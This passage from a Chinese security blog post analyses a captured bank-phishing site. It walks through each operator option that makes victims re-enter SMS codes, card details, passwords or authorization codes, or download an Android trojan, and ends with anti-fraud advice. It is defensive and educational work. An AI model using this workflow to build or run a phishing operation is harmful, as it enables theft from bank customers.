![front-submit-loading](https://image.3001.net/images/20211018/1634547939_616d38e3a832fec2bb68b.png!small)

这里空讲可能没什么概念，功能汇总有十几二十
个，就挨个给大家实际演示一遍，从骗子的视角过一遍大致就能体会了，还是用之前的表单数据提交，然后这部触发不同的功能后回去看结果：

#### “未通过”

未通过就是上面的加载页面，是默认状态，也是处理不通过返回之前的中转页面：

#### “通过--杀它”

标记通过后会跳转提交验证码的页面，这里获取验证码只是个幌子，真实情况是骗子在向银行发起请求获取验证码，然后骗取用户提交：

![front-res-1-pass-kill](https://image.3001.net/images/20211018/1634548031_616d393fa2740366c8993.png!small)

#### “验证码超时失效，请返回重新获取（不显示金额）”

如果你这边操作慢了，导致骗子那边输入超时，就会提示让你重新操作获取提交一次（想的真周到=_=）：

![front-res-2-msg-timeout](https://image.3001.net/images/20211018/1634548032_616d39404e77cea56e107.png!small)

#### “通过=【显示余额】”

只是不是有提供余额信息嘛，这里就提供用户确认再次骗取二维码（让人觉得像是银行正常查询出来的）：

![front-res-3-pass-show-amount](https://image.3001.net/images/20211018/1634548032_616d3940c862a5186c997.png!small)

#### “余额查询”

如果骗子那边执行什么操作核实到金额不对时，就是提示用户重新填写正确金额：

![front-res-4-amount-query-1](https://image.3001.net/images/20211018/1634548033_616d39416f0480989f68a.png!small)

![front-res-4-amount-query-2](https://image.3001.net/images/20211018/1634548034_616d3942228e5a4274d7e.png!small)

#### “取款密码错误”

如果发现取款密码不对，也会重新让用户提供：

![front-res-5-withdraw-passwd-wrong-1](https://image.3001.net/images/20211018/1634548034_616d3942a3c89e05b1903.png!small)

![front-res-5-withdraw-passwd-wrong-2](https://image.3001.net/images/20211018/1634548035_616d39434db664d2e0e73.png!small)

#### “手机号码错误”

然后是手机号：

![front-res-6-phone-wrong-1](https://image.3001.net/images/20211018/1634548035_616d3943d50d97356b181.png!small)

![front-res-6-phone-wrong-2](https://image.3001.net/images/20211018/1634548036_616d394457a46ded18a58.png!small)

#### “银行卡号错误”

银行卡号：

![front-res-7-bank-wrong-1](https://image.3001.net/images/20211018/1634548037_616d39450c7f0cfd558a7.png!small)

![front-res-7-bank-wrong-2](https://image.3001.net/images/20211018/1634548037_616d39458347244466675.png!small)

#### “身份正号错误”

姓名和身份正号：

![front-res-8-name-id-wrong-1](https://image.3001.net/images/20211018/1634548038_616d394612c4ae9741fcc.png!small)

![front-res-8-name-id-wrong-2](https://image.3001.net/images/20211018/1634548038_616d3946ab4d796de3e15.png!small)

#### “审核通过”

然后是审核通过，让你耐心等待结果（等待骗子把钱套走跑路 $_$）：

![front-res-9-pass-over](https://image.3001.net/images/20211018/1634548039_616d39474788dd35eda3f.png!small)

#### “不支持，请更换名下其他银行认证”

如果发现某些银行卡不太好利用，就会提示更换：

![front-res-10-not-support-bank](https://image.3001.net/images/20211018/1634548039_616d3947e224fb88cbb11.png!small)

#### “换【信用卡】"

换信用卡：

![front-res-11-change-credit-card](https://image.3001.net/images/20211018/1634548040_616d394896b73116e30f2.png!small)

#### “换【储蓄卡】”

换储蓄卡，反正对方为了达到目的，会反复榨干你的每一处积蓄，比大多数服务员都贴心……

![front-res-12-change-debit-card](https://image.3001.net/images/20211018/1634548041_616d39493bd20c4fbf60a.png!small)

#### “有效期和后三位/错误”

然后这个是信用卡相关的信息，和密码一样重要，也要注意不要轻易透露出去：

![front-res-13-change-valid-date-1](https://image.3001.net/images/20211018/1634548041_616d3949ba7468fec90bf.png!small)

![front-res-13-change-valid-date-2](https://image.3001.net/images/20211018/1634548042_616d394a5954e1ae7772d.png!small)

#### “【建设银行】==获取授权码”

使用建设银行应该是需要额外的授权码，骗子也会想办法搞到手：

![front-res-14-ccb-auth-code-1](https://image.3001.net/images/20211018/1634548042_616d394ae8c5567724b7f.png!small)

![front-res-14-ccb-auth-code-2](https://image.3001.net/images/20211018/1634548043_616d394b857b7a9f8fa23.png!small)

#### “【网银密码】”

如果存在网银，也会骗取登录密码进行远程套现：

![front-res-15-input-ebank-passwd-1](https://image.3001.net/images/20211018/1634548044_616d394c31d706dba4ee3.png!small)

![front-res-15-input-ebank-passwd-2](https://image.3001.net/images/20211018/1634548044_616d394ccb6fb945f534e.png!small)

#### “请保持银行卡内余额大于5000验证”

下面的就有意思了，如果骗子觉得你卡内金额太少（穷），就会提示你再多搞点过来：

![front-res-16-need-account-5000](https://image.3001.net/images/20211018/1634548045_616d394d987699400b939.png!small)

#### “请保持银行卡内余额大于10000验证”

或者骗子心情好，来个狮子大开口：

![front-res-17-need-account-10000](https://image.3001.net/images/20211018/1634548046_616d394eb92d92c6cb9ff.png!small)

#### “验证码超时失效，请返回重新获取（显示余额）”

然后这是验证码超时提示金额，和之前差不多：

![front-res-18-msg-timeout-show-amount-1](https://image.3001.net/images/20211018/1634548047_616d394f86db5b91c7dbf.png!small)

![front-res-18-msg-timeout-show-amount-2](https://image.3001.net/images/20211018/1634548048_616d39502f42e289950b0.png!small)

#### “只支持工、平、浦、招、光储蓄卡”

这里本来应该是提示支持指定银行，不过……看来天下开发者总是有不同的环境，类似的处境，唉，同情那位仁兄3秒：

![front-res-19-only-support-some-banks](https://image.3001.net/images/20211018/1634548048_616d3950d9c477c0d658e.png!small)

#### “下载 apk 拦截马”

这里也一样，本来该骗用户下载安卓木马的，但似乎也还没准备好：

![front-res-20-download-apk-trojan-1](https://image.3001.net/images/20211018/1634548049_616d39515e49b7a4b2d15.png!small)

![front-res-20-download-apk-trojan-2](https://image.3001.net/images/20211018/1634548050_616d39520e675f4d88642.png!small)

![front-res-20-download-apk-trojan-3](https://image.3001.net/images/20211018/1634548050_616d3952b532288ade10f.png!small)

#### “联系在线客服”

一样：

![front-res-21-contact-online-service](https://image.3001.net/images/20211018/1634548051_616d395374eb842f8d2bd.png!small)

#### “信息不一致，请返回从新填写正确的预留信息”

察觉用户输入信息不一致，重新填写：

![front-res-22-info-inconsistent](https://image.3001.net/images/20211018/1634548052_616d39540b731c64b95b1.png!small)

#### “扣款--打抢”

这里也有意思，基本就是骗子已经从用户手上套现了，为了安抚民心，整这一大段话提示用户这是流程的基本操作，以及后续会返还之类的（信你个gui）：

![front-res-23-stole-money-1](https://image.3001.net/images/20211018/1634548052_616d3954adcd0a11799c2.png!small)

![front-res-23-stole-money-2](https://image.3001.net/images/20211018/1634548053_616d39555b99422e087f2.png!small)

#### 【先回复打字，再设置此功能键】

然后这是最后一项了，大致就是骗子自己编话术，然后返回提示用户：

![front-res-24-self-define-reply-backend](https://image.3001.net/images/20211018/1634548054_616d39562647aeddae6d6.png!small)

![front-res-24-self-define-reply](https://image.3001.net/images/20211018/1634548054_616d3956af32853fe2cd5.png!small)

## 0x05 结语

正道的光可以迟到，但不能缺席，由于目前所收集的诈骗团伙相关信息还并不充分，后续会想办法陆陆续续收集，再交由警方处理。  
![zhapian-jubao-online](https://image.3001.net/images/20211018/1634548055_616d3957b655d9db1042c.png!small)

最后呢，其实也并没有什么额外要说的，因为防骗或安全意识这些大道理，国家政府再到媒体个人，每天都在强调，稍微留心一下就行了，从这整个过程看来（攻克过程不重要，可以忽略），贬义的讲，骗子考虑业务场景还挺周到的，也有不少地方在利用人的弱点，就比如之前图中那些接近官方的环境和话语，大家还是得注意分辨；

然后就是最最重要的，因为那封邮件是一切的开端，注意提高账户密保和安全性是一方面，比如加个登录二次验证什么的，另一方面就是不要轻信任何信息，涉及链接或二维码这些的，即使来自身边熟悉的人，因为他们可能也只是受害者链上的一个节点而已。  
![country-fanzha](https://image.3001.net/images/20211018/1634548057_616d3959152812ebf0fb7.jpg!small)

另外，额外宣传一波 (¬‿¬)，国家出台的反诈中心APP，除了风险检测与线上举报外，更有相当多的真实案例公布更新，可下载备用。

文章出自个人博客 <https://knightyun.github.io/2021/09/04/exploit-take-down-swindle-website>

